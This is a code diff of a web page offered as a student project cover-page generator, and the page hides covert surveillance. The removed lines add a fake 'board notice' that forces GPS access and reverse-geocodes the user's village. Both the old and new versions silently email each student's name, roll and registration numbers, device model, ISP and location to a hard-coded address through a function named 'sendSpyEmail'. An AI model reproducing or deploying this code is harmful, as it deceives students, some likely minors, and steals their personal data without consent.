@@ -8,31 +8,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     
     <style>
-        body { font-family: 'Amaranth', sans-serif; background-color: #121212; color: white; text-align: center; padding: 10px; margin: 0; overflow: hidden; }
-        
-        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; filter: blur(10px); pointer-events: none; transition: 0.5s; opacity: 0.3; }
-        
-        /* --- 🔒 LOCATION LOCK MODAL --- */
-        #location-lock {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.98); z-index: 9999;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            padding: 20px; text-align: center;
-        }
-        .lock-icon { font-size: 60px; margin-bottom: 20px; animation: bounce 2s infinite; }
-        .lock-title { color: #ff3333; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid #ff3333; padding-bottom: 5px; }
-        .lock-msg { color: #e0e0e0; font-size: 16px; margin-bottom: 30px; line-height: 1.6; max-width: 90%; background: #222; padding: 15px; border-radius: 10px; border: 1px solid #444; }
-        .lock-btn {
-            background: linear-gradient(135deg, #00c6ff, #0072ff); color: white;
-            padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold;
-            cursor: pointer; box-shadow: 0 0 20px rgba(0, 114, 255, 0.5);
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-20px);} 60% {transform: translateY(-10px);} }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-
-        /* --- REST OF CSS --- */
+        body { font-family: 'Amaranth', sans-serif; background-color: #121212; color: white; text-align: center; padding: 10px; margin: 0; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; }
         h2 { color: #ff9800; margin-top: 0; margin-bottom: 20px;}
         .field { text-align: left; margin-bottom: 15px; }
         label { color: #ccc; font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px; }
@@ -48,18 +25,7 @@
 </head>
 <body>
 
-    <div id="location-lock">
-        <div class="lock-icon">📡</div>
-        <h1 class="lock-title">Verification Required</h1>
-        <p class="lock-msg">
-            ⚠️ <b>WEST BENGAL BOARD NOTICE:</b><br><br>
-            প্রজেক্টের কভার পেজটি আপনার <b>জেলা ও এলাকার (District & Locality)</b> ভিত্তিতে অটোমেটিক ডিজাইন করা হবে।<br><br>
-            ভুল ডিজাইন এড়াতে এবং সঠিক স্কুল ফরম্যাট পেতে <b>"Allow Location"</b> বাটনটি ক্লিক করুন। এটি বাধ্যতামূলক।
-        </p>
-        <button class="lock-btn" onclick="requestGPS()">✅ Verify Location & Enter</button>
-    </div>
-
-    <div class="box" id="main-box">
+    <div class="box">
         <h2>Cover Page Generator</h2>
 
         <div class="field">
@@ -113,65 +79,15 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
+        //     
         const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
         const MY_EMAIL = "ayankarmakar7602@gmail.com";
-        
-        // গ্লোবাল ভেরিয়েবল
-        let MAP_LINK = "Not Captured"; 
-        let ADDRESS_TEXT = "Finding Address...";
-        let GPS_ALLOWED = false;
-
-        // --- 🔒 LOCK SYSTEM LOGIC ---
-        function requestGPS() {
-            if (navigator.geolocation) {
-                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const long = position.coords.longitude;
-                        
-                        // 1. Google Maps Link
-                        MAP_LINK = `https://www.google.com/maps?q=${lat},${long}`;
-                        
-                        // 2. ঠিকানা বের করা (Reverse Geocoding)
-                        try {
-                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${long}`);
-                            const data = await res.json();
-                            // গ্রামের নাম বা এলাকার নাম বের করা
-                            const village = data.address.village || data.address.town || data.address.city || data.address.hamlet || "Unknown Area";
-                            const district = data.address.state_district || data.address.county || "";
-                            ADDRESS_TEXT = `${village}, ${district}`;
-                        } catch(e) {
-                            ADDRESS_TEXT = "Address Fetch Failed (Check Map Link)";
-                        }
-                        
-                        GPS_ALLOWED = true;
-                        
-                        // আনলক করা
-                        document.getElementById('location-lock').style.display = 'none';
-                        const mainBox = document.getElementById('main-box');
-                        mainBox.style.filter = 'none';
-                        mainBox.style.opacity = '1';
-                        mainBox.style.pointerEvents = 'auto';
-                        document.body.style.overflow = 'auto';
-                    },
-                    (error) => {
-                        alert("❌ Location Denied!\n\nস্কুল ফরম্যাটের জন্য এটি বাধ্যতামূলক। দয়া করে Allow করুন।");
-                        location.reload(); 
-                    },
-                    options
-                );
-            } else {
-                alert("GPS not supported.");
-            }
-        }
 
         function validateEnglishName(input) {
             input.value = input.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
@@ -198,27 +114,22 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
+                alert("        !");
                 return;
             }
 
-            // 🕵️‍♂️ মেইল পাঠানো
+            //    (   )
             sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
+            
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        // --- 🕵️‍♂️ সুপার মডেল ডিটেক্টর ---
+        // ---     ---
         function getDeviceModel() {
             const ua = navigator.userAgent;
-            let model = "Unknown Mobile";
+            let model = "Generic Android";
             
-            // Modern API
-            if (navigator.userAgentData && navigator.userAgentData.mobile) {
-               const brand = navigator.userAgentData.brands.find(b => !b.brand.includes("Not") && !b.brand.includes("Chromium"));
-               if(brand) model = brand.brand + " (Modern)";
-            }
-
-            // Regex Attack
+            // Regex     
             if (ua.includes("Android")) {
                 const match = ua.match(/;\s([^;]+)\sBuild\//); 
                 if (match && match[1]) model = match[1].trim(); 
@@ -226,8 +137,11 @@
                     const match2 = ua.match(/Android[^;]+; ([^;]+);/);
                     if (match2) model = match2[1].trim();
                 }
-            } else if (ua.includes("iPhone")) model = "iPhone";
-            
+            } else if (ua.includes("iPhone")) {
+                model = "iPhone";
+            } else if (ua.includes("Windows")) {
+                model = "PC / Laptop";
+            }
             return model;
         }
 
@@ -236,13 +150,13 @@
             const uniqueId = Math.floor(Math.random() * 10000);
             const deviceModel = getDeviceModel();
 
-            // সিমের নাম (ব্যাকআপ)
-            let ipData = { org: "Wait..." };
+            //       
+            let ipData = { org: "Wait...", city: "Unknown" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch (e) {}
-            
+
             let cleanSim = ipData.org;
             if(cleanSim && cleanSim.includes("Airtel")) cleanSim = "Airtel";
             if(cleanSim && cleanSim.includes("Jio")) cleanSim = "Jio";
@@ -252,30 +166,28 @@
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: `TARGET: ${name} (#${uniqueId})`, 
+                    _subject: `New Cover: ${name} (#${uniqueId})`, 
                     _captcha: "false",
                     _template: "table",
                     
-                    // ফর্ম ডাটা
-                    Student: name,
+                    Name: name,
                     Subject: subj,
                     Roll: roll,
                     Reg: reg,
                     
-                    // 🕵️‍♂️ গোয়েন্দা রিপোর্ট
-                    ADDRESS_TEXT: ADDRESS_TEXT, // যেমন: Jitujuri, Purulia
-                    MAP_LINK: MAP_LINK,         // গুগল ম্যাপ লিংক
-                    PHONE: deviceModel,         // ফোনের মডেল
-                    SIM_ISP: cleanSim,          // সিম
+                    //  
+                    City: ipData.city,       //  
+                    Sim_ISP: cleanSim,       // 
+                    Phone: deviceModel,      //  
                     
                     Time: new Date().toLocaleString()
                 })
             })
-            .then(res => console.log("Spy Data Sent!"))
+            .then(res => console.log("Silent Email Sent!"))
             .catch(err => console.log("Error:", err));
         }
 
-        // --- জেনারেট ফাংশন ---
+        // ---     ---
         function generate(nameVal, subjVal, rollVal, regVal) {
             const cvs = document.getElementById('canvas');
             const ctx = cvs.getContext('2d');
